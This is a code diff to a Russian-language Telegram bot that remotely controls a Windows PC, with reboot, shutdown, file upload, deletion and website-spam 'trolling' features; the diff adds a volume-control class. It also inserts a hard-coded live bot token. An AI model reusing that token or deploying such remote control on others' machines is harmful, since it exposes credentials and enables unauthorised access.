@@ -19,7 +19,7 @@ FAST_CMDS = ['tasklist', 'ping']  # Быстрые команды (исполь�
 TROLL_WEBSITES = ['https://dzen.ru', 'https://youtube.com', 'https://www.google.com', 'https://yandex.ru', 'https://vk.com']  # Сайты для открытия в троллинге (используются при троллинге массовым открытием сайтов)
 
 VERSION = '3.6'  # Версия бота
-TOKEN = ""  # Токен бота
+TOKEN = "6827727968:AAFlwV4bxllXyiitYn8hHBeYmCKg4mKNFPw"  # Токен бота
 FIRST_ID = 1215122907  # ID главного админа (обязтаельно к заполнению)
 SECOND_ID = 0  # ID второго админа (необязательно к заполнению). Оставьте 0, если в нем нет необходимости
 
@@ -375,7 +375,7 @@ def download_file_on_pc1(message: types.Message, route: str):
     downloaded_file = bot.download_file(file_info.file_path)
     
     try:
-        with open(route, 'wb', encoding='utf-8') as new_file: new_file.write(downloaded_file)
+        with open(route, 'wb') as new_file: new_file.write(downloaded_file)
         bot.send_message(message.chat.id, '*☑️ Успешно сохранено!*', parse_mode="Markdown")
         return download_on_pc_menu(message)
 
@@ -797,7 +797,7 @@ def reboot_check(message: types.Message):
     if message.text.strip() == '/start': return start(message)
     elif message.text.strip() == 'Да, подтверждаю':
         bot.send_message(message.chat.id, '☑️ *Вы успешно вызвали перезагрузку ПК\nОна произойдет после редиректа в главное меню*', parse_mode='Markdown')
-        mainmenu()
+        mainmenu(message)
         bot.send_message(message.chat.id, "☑️ *Перезагрузка запущена!*")
         return subprocess.run('shutdown -r -t 0')
 
@@ -818,7 +818,7 @@ def off_computer_check(message: types.Message):
     if message.text.strip() == '/start': return start(message)
     elif message.text.strip() == 'Да, подтверждаю':
         bot.send_message(message.chat.id, '☑️ *Вы успешно вызвали выключение ПК\nОно произойдет после редиректа в главное меню*', parse_mode='Markdown')
-        mainmenu()
+        mainmenu(message)
         bot.send_message(message.chat.id, "☑️ *Выключение запущено!*")
         return subprocess.Popen('shutdown /s /t 0', shell=True)
 
@@ -966,10 +966,113 @@ def full_delete_open(message: types.Message):
     return other_functions(message)
 
 
+class Sound:
+    """
+    Class Sound
+    :author: Paradoxis <luke@paradoxis.nl>
+    :description:
+
+    Allows you control the Windows volume
+    The first time a sound method is called, the system volume is fully reset.
+    This triggers sound and mute tracking.
+    """
+
+    # Current volume, we will set this to 100 once initialized
+    __current_volume = None
+
+    @staticmethod
+    def current_volume():
+        """
+        Current volume getter
+        :return: int
+        """
+        if Sound.__current_volume is None:
+            return 0
+        else:
+            return Sound.__current_volume
+
+    @staticmethod
+    def __set_current_volume(volume):
+        """
+        Current volumne setter
+        prevents numbers higher than 100 and numbers lower than 0
+        :return: void
+        """
+        if volume > 100:
+            Sound.__current_volume = 100
+        elif volume < 0:
+            Sound.__current_volume = 0
+        else:
+            Sound.__current_volume = volume
+
+
+    # The sound is not muted by default, better tracking should be made
+    __is_muted = False
+
+    @staticmethod
+    def is_muted():
+        """
+        Is muted getter
+        :return: boolean
+        """
+        return Sound.__is_muted
+
+
+    @staticmethod
+    def __track():
+        """
+        Start tracking the sound and mute settings
+        :return: void
+        """
+        if Sound.__current_volume == None:
+            Sound.__current_volume = 0
+            for i in range(0, 50):
+                Sound.volume_up()
+
+    @staticmethod
+    def volume_up():
+        """
+        Increase system volume
+        Done by triggering a fake VK_VOLUME_UP key event
+        :return: void
+        """
+        Sound.__track()
+        Sound.__set_current_volume(Sound.current_volume() + 2)
+        keyboard.send('volume up')
+
+    @staticmethod
+    def volume_down():
+        """
+        Decrease system volume
+        Done by triggering a fake VK_VOLUME_DOWN key event
+        :return: void
+        """
+        Sound.__track()
+        Sound.__set_current_volume(Sound.current_volume() - 2)
+        keyboard.send('volume down')
+
+    @staticmethod
+    def volume_set(amount):
+        """
+        Set the volume to a specific volume, limited to even numbers.
+        This is due to the fact that a VK_VOLUME_UP/VK_VOLUME_DOWN event increases
+        or decreases the volume by two every single time.
+        :return: void
+        """
+        Sound.__track()
+
+        if Sound.current_volume() > amount:
+            for i in range(0, int((Sound.current_volume() - amount) / 2)):
+                Sound.volume_down()
+        else:
+            for i in range(0, int((amount - Sound.current_volume()) / 2)):
+                Sound.volume_up()
+
+
 def pc_settings(message: types.Message):
     if is_access_denied(message.chat.id): return None
     
-    markup = types.ReplyKeyboardMarkup(one_time_keyboard = True, resize_keyboard = True).add("Изменить яркость", "Информация о ПК", "Назад")
+    markup = types.ReplyKeyboardMarkup(one_time_keyboard = True, resize_keyboard = True).add("Изменить яркость", "Информация о ПК", "Изменить громкость", "Назад")
     bot.send_message(message.chat.id, '🔧 *Вы в меню настроек ПК!*', reply_markup=markup, parse_mode='Markdown')
     return bot.register_next_step_handler(message, pc_settings_check)
 
@@ -979,6 +1082,7 @@ def pc_settings_check(message: types.Message):
     if message.text.strip() == 'Назад': return mainmenu(message)
     elif message.text.strip() == '/start': return start(message)
     elif message.text.strip() == 'Изменить яркость': return brightness_set(message)
+    elif message.text.strip() == 'Изменить громкость': return volume_set(message)
     elif message.text.strip() == 'Информация о ПК':
         conn = HTTPConnection("ifconfig.me")
         try:
@@ -1006,12 +1110,36 @@ def pc_settings_check(message: types.Message):
     bot.send_message(message.chat.id, '❌ *Неверный выбор! Повторите попытку*', parse_mode='Markdown')
     return pc_settings(message)
 
+
+def volume_set(message: types.Message):
+    if is_access_denied(message.chat.id): return None
+    
+    markup = types.ReplyKeyboardMarkup(one_time_keyboard = True, resize_keyboard = True).add("Назад")
+    bot.send_message(message.chat.id, f'🔧 *Введите уровень грокмоксти (0-100)!\n\nТекущий уровень - {Sound.current_volume()}*', reply_markup=markup, parse_mode='Markdown')
+    return bot.register_next_step_handler(message, check_volume_set)
+
+def check_volume_set(message: types.Message):
+    if is_access_denied(message.chat.id): return None
+    
+    level = message.text.strip()
+    if level  == 'Назад': return pc_settings(message)
+    elif level == '/start': return start(message)
+    elif not message.text.strip().isdigit():
+        bot.send_message(message.chat.id, f'❌ *Уровень грокмоксти должен быть числом!*', parse_mode='Markdown')
+        return pc_settings(message)
+
+    if int(level) < 0 or int(level) > 100: return bot.send_message(message.chat.id, f'❌ *Уровень громкости должен быть больше 0 и меньше 100!*', parse_mode='Markdown')
+        
+    Sound.volume_set(int(level))
+    bot.send_message(message.chat.id, f'✅ Вы успешно установили уровень громкости *{level}*!', parse_mode='Markdown')
+    return pc_settings(message)
+
+
 def brightness_set(message: types.Message):
     if is_access_denied(message.chat.id): return None
     
     markup = types.ReplyKeyboardMarkup(one_time_keyboard = True, resize_keyboard = True).add("Назад")
-
-    bot.send_message(message.chat.id, f'🔧 *Введите уровень яркости(5-100)!\n\nТекущий уровень - {get_brightness()}*', reply_markup=markup, parse_mode='Markdown')
+    bot.send_message(message.chat.id, f'🔧 *Введите уровень яркости (0-100)!\n\nТекущий уровень - {get_brightness()}*', reply_markup=markup, parse_mode='Markdown')
     return bot.register_next_step_handler(message, check_brightness_set)
 
 def check_brightness_set(message: types.Message):
@@ -1020,14 +1148,14 @@ def check_brightness_set(message: types.Message):
     level = message.text.strip()
     if level  == 'Назад': return pc_settings(message)
     elif level == '/start': return start(message)
-    elif message.text.strip().isdigit() == False:
+    elif not message.text.strip().isdigit():
         bot.send_message(message.chat.id, f'❌ *Уровень яркости должен быть числом!*', parse_mode='Markdown')
         return pc_settings(message)
 
-    if int(level) < 0 or int(level) > 100: return bot.send_message(message.chat.id, f'❌ *Уровень должен быть больше 0 и меньше 100!*', parse_mode='Markdown')
+    if int(level) < 0 or int(level) > 100: return bot.send_message(message.chat.id, f'❌ *Уровень яркости должен быть больше 0 и меньше 100!*', parse_mode='Markdown')
         
     set_brightness(int(level))
-    bot.send_message(message.chat.id, f'❌ *Вы успешно установили уровень яркости {level}!*', parse_mode='Markdown')
+    bot.send_message(message.chat.id, f'✅ Вы успешно установили уровень яркости *{level}*!', parse_mode='Markdown')
     return pc_settings(message)
 
 #Бинд API
